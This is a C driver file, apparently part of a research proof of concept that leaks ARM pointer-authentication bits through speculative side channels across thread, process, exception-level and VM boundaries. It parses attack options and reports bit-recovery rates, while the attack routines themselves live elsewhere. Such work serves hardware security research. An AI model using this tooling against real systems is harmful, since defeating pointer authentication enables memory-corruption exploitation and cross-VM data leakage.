#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <getopt.h>
#include <sys/auxv.h>
#include <asm/hwcap.h>
#include "leak.h"

FILE *g_save = NULL;

void tee_printf(const char *fmt, ...) {
    va_list args;
    va_start(args, fmt);
    vprintf(fmt, args);
    va_end(args);
    if (g_save) {
        va_start(args, fmt);
        vfprintf(g_save, fmt, args);
        va_end(args);
    }
}

const char *switch_name(enum pac_switch sw) {
    return (SW_AUT == sw) ? "aut" : "canon";
}
const char *medium_name(enum medium med) {
    if (M_L1D == med) {
        return "L1D";
    }
    if (M_DTLB == med) {
        return "dTLB";
    }
    if (M_ITLB == med) {
        return "iTLB";
    }
    return "BTB";
}
const char *timer_name(enum timer tmr) {
    return (T_PMU == tmr) ? "pmu" : "cntvct";
}
const char *boundary_name(enum boundary bnd) {
    if (B_SAME == bnd) {
        return "same thread (EL0)";
    }
    if (B_XTHREAD == bnd) {
        return "cross thread, one core (EL0)";
    }
    if (B_XPROC == bnd) {
        return "cross process (EL0 to EL0)";
    }
    if (B_XEL == bnd) {
        return "cross EL (EL2 to EL0)";
    }
    return "cross VM (guest to host)";
}

int bits_match(unsigned recovered, unsigned truth, int width) {
    int count = 0;
    for (int bit = 0; bit < width; ++bit) {
        if (((recovered >> bit) & 1u) == ((truth >> bit) & 1u)) {
            count++;
        }
    }
    return count;
}

void report(const struct cfg *cfg, const struct chan_stats *stats) {
    double per_bit = (0 < stats->bits_total) ? 100.0 * stats->bits_correct / stats->bits_total : 0.0;
    double full = (0 < stats->rounds) ? 100.0 * stats->full / stats->rounds : 0.0;
    double bits_per_sec = (0.0 < stats->seconds) ? stats->bits_total / stats->seconds : 0.0;
    tee_printf("\n%s PAC leak : %s, %s medium, %s timer\n",
        switch_name(cfg->sw), boundary_name(cfg->bnd), medium_name(cfg->med), timer_name(cfg->tmr));
    tee_printf("  per-bit rate : %ld/%ld bits (%.2f%%)\n", stats->bits_correct, stats->bits_total, per_bit);
    tee_printf("  full PAC rate: %d/%d rounds (%.1f%%)\n", stats->full, stats->rounds, full);
    tee_printf("  throughput   : %.0f bits/s\n", bits_per_sec);
    if (stats->nbits > 1) {
        tee_printf("  per-position [48+k] accuracy:\n");
        for (int k = 0; k < stats->nbits && k < SECRET_BITS; ++k) {
            if (stats->pos_total[k] <= 0) { continue; }
            tee_printf("    bit[%2d] (hw %2d): %ld/%ld = %.1f%%\n",
                k, 48 + k, stats->pos_correct[k], stats->pos_total[k],
                100.0 * stats->pos_correct[k] / stats->pos_total[k]);
        }
    }
}

static int parse_switch(const char *name, enum pac_switch *out) {
    if (0 == strcmp(name, "aut")) {
        *out = SW_AUT;
    } else if (0 == strcmp(name, "canon")) {
        *out = SW_CANON;
    } else {
        return -1;
    }
    return 0;
}
static int parse_boundary(const char *name, enum boundary *out) {
    if (0 == strcmp(name, "same")) {
        *out = B_SAME;
    } else if (0 == strcmp(name, "xthread")) {
        *out = B_XTHREAD;
    } else if (0 == strcmp(name, "xproc")) {
        *out = B_XPROC;
    } else if (0 == strcmp(name, "xel")) {
        *out = B_XEL;
    } else if (0 == strcmp(name, "xvm")) {
        *out = B_XVM;
    } else {
        return -1;
    }
    return 0;
}
static int parse_medium(const char *name, enum medium *out) {
    if (0 == strcmp(name, "l1d")) {
        *out = M_L1D;
    } else if (0 == strcmp(name, "dtlb")) {
        *out = M_DTLB;
    } else if (0 == strcmp(name, "itlb")) {
        *out = M_ITLB;
    } else if (0 == strcmp(name, "btb")) {
        *out = M_BTB;
    } else {
        return -1;
    }
    return 0;
}
static int parse_timer(const char *name, enum timer *out) {
    if (0 == strcmp(name, "pmu")) {
        *out = T_PMU;
    } else if (0 == strcmp(name, "cntvct")) {
        *out = T_CNTVCT;
    } else {
        return -1;
    }
    return 0;
}

static void usage(const char *argv0) {
    printf(
"usage: %s --switch aut|canon --boundary same|xthread|xproc|xel|xvm\n"
"          --medium l1d|dtlb|itlb|btb --timer pmu|cntvct --cpu N --rounds N --samples N\n"
"          [--move48 on|off] [--control barrier] [--save FILE]\n"
"\n"
"Each round the victim signs a pointer afresh and the attacker recovers the 7-bit\n"
"pointer-authentication field [54:48] one bit at a time through the chosen medium and timer.\n"
"\n"
"  --switch   aut    extract PAC bit b, place it at bit 55, authenticate; in range iff the bit is 0\n"
"             canon  mask the signature to keep bit 48+b; in range iff the bit is 0\n"
"  --boundary same    victim and attacker in one thread\n"
"             xthread victim and attacker threads of one process on one core\n"
"             xproc   a separate victim binary over the shared per-core BTB (also L1D prime and probe)\n"
"             xel     an EL2 kernel-module victim\n"
"             xvm     a KVM guest over the shared per-core BTB\n"
"  --medium   l1d|dtlb|itlb|btb which structure carries the footprint\n"
"  --timer    pmu    PMU refill events (needs raw_pmu.ko); cntvct the generic virtual timer\n"
"  --cpu N    core to pin to\n"
"  --rounds N independent rounds, each a fresh signature\n"
"  --samples N transmits averaged per bit\n"
"  --move48 on|off  force the index-48 relocation on or off (default on only for dtlb canon)\n"
"  --control barrier  close the speculation window to confirm the signal is speculative\n"
"  --save FILE also write the scoreboard to FILE\n"
"\n"
"Examples:\n"
"  %s --switch canon --boundary same    --medium l1d  --timer pmu    --cpu 90 --rounds 20 --samples 2\n"
"  %s --switch aut   --boundary xthread --medium dtlb --timer pmu    --cpu 90 --rounds 20 --samples 40\n"
"  %s --switch canon --boundary xproc   --medium btb  --timer cntvct --cpu 90 --rounds 20 --samples 140\n"
"  %s --switch aut   --boundary xel     --medium itlb --timer pmu    --cpu 90 --rounds 20 --samples 12\n"
"  %s --switch canon --boundary xvm     --medium btb  --timer cntvct --cpu 90 --rounds 20 --samples 120\n",
        argv0, argv0, argv0, argv0, argv0, argv0);
}

int main(int argc, char **argv) {
    struct cfg cfg = { 0 };
    const char *savepath = NULL;
    int have_switch = 0;
    int have_boundary = 0;
    int have_medium = 0;
    int have_timer = 0;
    int cpu = -1;
    int rounds = 0;
    int samples = 0;
    int move48_override = -1;   // -1 auto (dtlb+canon on by default), 0 force in-place, 1 force move-to-48
    enum { O_SWITCH = 1000, O_BOUNDARY, O_MEDIUM, O_TIMER, O_CPU, O_ROUNDS, O_SAMPLES, O_CONTROL, O_SAVE, O_MOVE48 };
    static struct option opts[] = {
        {"switch", 1, 0, O_SWITCH}, {"boundary", 1, 0, O_BOUNDARY}, {"medium", 1, 0, O_MEDIUM},
        {"timer", 1, 0, O_TIMER}, {"cpu", 1, 0, O_CPU}, {"rounds", 1, 0, O_ROUNDS},
        {"samples", 1, 0, O_SAMPLES}, {"control", 1, 0, O_CONTROL}, {"save", 1, 0, O_SAVE},
        {"move48", 1, 0, O_MOVE48},
        {"help", 0, 0, 'h'}, {0, 0, 0, 0}
    };
    int opt = 0;
    while (-1 != (opt = getopt_long(argc, argv, "h", opts, 0))) {
        switch (opt) {
            case O_SWITCH:
                if (0 != parse_switch(optarg, &cfg.sw)) {
                    fprintf(stderr, "error: --switch must be aut or canon\n");
                    return 2;
                }
                have_switch = 1;
                break;
            case O_BOUNDARY:
                if (0 != parse_boundary(optarg, &cfg.bnd)) {
                    fprintf(stderr, "error: --boundary must be same, xthread, xproc, xel, or xvm\n");
                    return 2;
                }
                have_boundary = 1;
                break;
            case O_MEDIUM:
                if (0 != parse_medium(optarg, &cfg.med)) {
                    fprintf(stderr, "error: --medium must be l1d, dtlb, itlb, or btb\n");
                    return 2;
                }
                have_medium = 1;
                break;
            case O_TIMER:
                if (0 != parse_timer(optarg, &cfg.tmr)) {
                    fprintf(stderr, "error: --timer must be pmu or cntvct\n");
                    return 2;
                }
                have_timer = 1;
                break;
            case O_CPU:
                cpu = atoi(optarg);
                break;
            case O_ROUNDS:
                rounds = atoi(optarg);
                break;
            case O_SAMPLES:
                samples = atoi(optarg);
                break;
            case O_CONTROL:
                if (0 != strcmp(optarg, "barrier")) {
                    fprintf(stderr, "error: --control must be barrier\n");
                    return 2;
                }
                cfg.control = 1;
                break;
            case O_MOVE48:
                if (0 == strcmp(optarg, "on")) {
                    move48_override = 1;
                } else if (0 == strcmp(optarg, "off")) {
                    move48_override = 0;
                } else {
                    fprintf(stderr, "error: --move48 must be on or off\n");
                    return 2;
                }
                break;
            case O_SAVE:
                savepath = optarg;
                break;
            case 'h':
                usage(argv[0]);
                return 0;
            default:
                usage(argv[0]);
                return 2;
        }
    }
    if (!have_switch || !have_boundary || !have_medium || !have_timer ||
        cpu < 0 || rounds <= 0 || samples <= 0) {
        fprintf(stderr, "error: missing required option\n");
        usage(argv[0]);
        return 2;
    }
    cfg.cpu = cpu;
    cfg.rounds = rounds;
    cfg.samples = samples;

    if (M_BTB == cfg.med) {
        if (SW_AUT == cfg.sw) {
            fprintf(stderr, "error: the branch-target buffer allocates for any canonical target regardless "
                            "of range, so --switch aut has no btb channel. Use --switch canon for btb\n");
            return 2;
        }
        if (B_XEL == cfg.bnd) {
            fprintf(stderr, "error: the btb channel is not wired for the xel (kernel EL2) victim; "
                            "use same, xthread, xproc, or xvm\n");
            return 2;
        }
    }

    if (0 == (getauxval(AT_HWCAP) & HWCAP_PACA)) {
        fprintf(stderr, "error: FEAT_PAuth absent; pacia/autiza are no-ops and the secret would be zero\n");
        return 1;
    }

    if (savepath) {
        g_save = fopen(savepath, "w");
        if (NULL == g_save) {
            perror("--save");
            return 1;
        }
        setvbuf(g_save, NULL, _IOLBF, 0);
    }
    setvbuf(stdout, NULL, _IONBF, 0);

    g_move48 = (M_DTLB == cfg.med && SW_CANON == cfg.sw);   // only dtlb canon relocates to index 48, other media read in place
    if (move48_override >= 0) {
        g_move48 = move48_override;   // --move48 on|off overrides the auto default (for the in-place dtlb study)
    }

    struct chan_stats stats = { 0 };
    int rc = 0;
    if (B_SAME == cfg.bnd) {
        rc = run_same(&cfg, &stats);
    } else if (B_XTHREAD == cfg.bnd) {
        rc = run_xthread(&cfg, &stats);
    } else if (B_XPROC == cfg.bnd) {
        rc = run_xproc(&cfg, &stats);
    } else if (B_XEL == cfg.bnd) {
        rc = run_xel(&cfg, &stats);
    } else {
        rc = run_xvm(&cfg, &stats);
    }
    if (0 == rc) {
        report(&cfg, &stats);
    }
    if (g_save) {
        fclose(g_save);
    }
    return rc;
}
